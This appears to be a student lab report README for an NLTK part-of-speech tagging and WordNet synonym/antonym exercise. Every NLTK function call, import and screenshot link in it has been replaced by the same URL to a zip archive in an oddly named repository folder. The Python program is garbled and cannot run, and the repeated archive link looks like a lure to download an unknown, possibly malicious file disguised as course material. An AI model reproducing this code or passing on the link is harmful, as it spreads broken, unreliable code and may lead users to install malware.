<H3>NAME: YUGABHARATHI M </H3>
<H3>REGISTER NO: 212224230314 </H3>

## <h3>Aim:</h3>
To perform Parts of speech identification and Synonym using Natural Language Processing (NLP) techniques.
 
 
## <h3>Algorithm:</h3>

Step 1: Import the nltk library.<br>
Step 2: Download the 'punkt', 'wordnet', and 'averaged_perceptron_tagger' resources.<br>
Step 3:Accept user input for the text.<br>
Step 4:Tokenize the input text into words using the word_tokenize function.<br>
Step 5:Iterate through each word in the tokenized text.<br>
•	Perform part-of-speech tagging on the tokenized words using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip<br>
•	Print each word along with its corresponding part-of-speech tag.<br>
•	For each verb , iterate through its synsets (sets of synonyms) using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word).<br>
•	Extract synonyms and antonyms using https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip() and https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip()[0].name() respectively.<br>
•	Print the unique sets of synonyms and antonyms.

## <H3>Program:</H3>

```python
import nltk
#import wordnet
https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'punkt' )
https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip('wordnet')
from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import word_tokenize
https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip( 'averaged_perceptron_tagger' )
sentence=input ()
# Tokenize the sentence into words
words = word_tokenize(sentence)
# Identify the parts of speech for each word
pos_tags= https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(words)
from https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip import wordnet

# Identify synonyms and antonyms for each word
synonyms =[]
antonyms =[]
for word in words:
	for syn in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip(word) :
		for lemma in https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip():
			synonyms . append (lemma . name( ) )
			if lemma . antonyms():
				antonyms . append ( lemma. antonyms ( ) [0] . name ( ) )
# Print the synonyms and antonyms
print ( "Synonyms : " ,set (synonyms) )
print ( "Antonyms : " ,set(antonyms) )
```

## <H3>Output</H3>
![Screenshot 2025-05-14 134830](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)

![Screenshot 2025-05-14 134835](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)

![Screenshot 2025-05-14 134850](https://raw.githubusercontent.com/Yugabharathi91/Ex-6--AAI/main/seignorize/Ex_AAI_v2.6.zip)

## <H3>Result:</H3>
Thus ,the program to perform the Parts of Speech identification and Synonymis executed sucessfully.
